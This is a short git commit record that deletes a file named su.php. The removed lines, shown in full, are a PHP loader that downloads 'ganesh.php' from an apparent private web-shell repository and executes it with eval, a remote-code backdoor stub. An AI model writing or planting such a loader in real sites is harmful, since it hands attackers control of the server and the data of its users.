cb9a726dc67185f1a0c723f4f2538af95e3f4e3e
Botem7 <botemmm7@gmail.com>
2025-01-15 03:20:58 +0700

    Delete su.php

--- su.php
+++
@@ -1,8 +0,0 @@
-<?php 
-$url = "https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php";
-$ch = curl_init($url); 
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($ch);
-eval("?>".$result);
-
-?>
